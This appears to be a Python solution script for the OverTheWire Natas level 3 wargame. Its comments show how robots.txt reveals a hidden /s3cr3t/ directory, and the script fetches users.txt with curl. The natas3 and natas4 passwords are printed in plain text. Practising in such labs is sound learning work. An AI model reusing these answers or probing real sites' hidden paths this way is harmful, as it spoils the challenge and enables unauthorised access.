# https://overthewire.org/wargames/natas/natas3.html
# Natas Level 2 → Level 3
# Username: natas3
# URL:      http://natas3.natas.labs.overthewire.org



# Below is the page source wow :

# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
# <script>var wechallinfo = { "level": "natas3", "pass": "3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH" };</script></head>
# <body>
# <h1>natas3</h1>
# <div id="content">
# There is nothing on this page
# <!-- No more information leaks!! Not even Google will find it this time... -->
# </div>
# </body></html>


# Some clues i found using the above source :

# What does it mean “not even Google will find it”?
# How do you tell a search engine not to index something?
# Which file on a webserver controls that?
# --> robots.txt ?

# found this gem :
# http://natas3.natas.labs.overthewire.org/robots.txt
# User-agent: *
# Disallow: /s3cr3t/\

# it points to a directory
# http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
# natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ


import subprocess
import sys

def main():
    # -s means silent we don't require
    command="curl -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt"

    try:
        # sspawn that shell to run it
        result=subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            check=True
        )

        if result.stdout:
            # Remove shell whitespaces plls
            print(result.stdout.strip())
        else :
            print("No results found")
    # error handling not needed but still
    except subprocess.CalledProcessError as e:
        print(f"Command faiiled with exit code {e.returncode}")
        if e.stderr:
            print(f"Error : {e.stderr}")
        sys.exit(1) # need to exit the spawneed shell or it takes memeory
    except FileNotFoundError :
       print("Error: curl might be uninstalled or file not there")
       sys.exit(1) 



if __name__=="__main__":
    main()    


# natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ